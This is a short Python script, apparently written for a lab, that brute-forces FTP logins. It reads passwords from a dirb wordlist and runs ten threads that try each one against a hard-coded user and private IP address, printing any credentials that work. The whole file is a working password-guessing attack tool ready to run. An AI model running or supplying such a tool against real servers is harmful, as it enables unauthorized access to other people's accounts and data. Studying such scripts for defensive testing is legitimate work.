import ftplib
import time
import threading
import queue

class thread_brute_ftp(threading.Thread):
    def __init__(self,host,user,q):
        threading.Thread.__init__(self)
        self.host = host
        self.user = user
        self.q = q
    def run(self):
        while not self.q.empty():
            password = self.q.get()
           # print(password)
            state  = brute_ftp(self.host,self.user,str(password))
            if state == True:
                self.q.queue.clear()
                break
            elif state == False:
                continue
def brute_ftp(host,user,password):
    ftp = ftplib.FTP(host)
    try:
        res = ftp.login(user,password)
        print("[+] Success host:%s user:%s password: %s" %(host,user,password))
        print(res)
        return True
    except:
        print("[-] user:%s password:%s" %(user,password))
        return False
    else:
        ftp.quit()

def get_password(dirb):
    q = queue.Queue()
    with open(dirb) as f:
        for line in f:
            password = line.strip('\r').strip('\n')
            q.put(password)
    return q

def main():
    host = '172.20.10.139'
    user = 'yangfan'
    dirb = '/usr/share/wordlists/dirb/small.txt'
    threads = []
    q = get_password(dirb)
    for tName in range(10):
        thread = thread_brute_ftp(host,user,q)
        thread.start()
        threads.append(thread)
    
    for t in threads:
        t.join()



if __name__=='__main__':
    main()
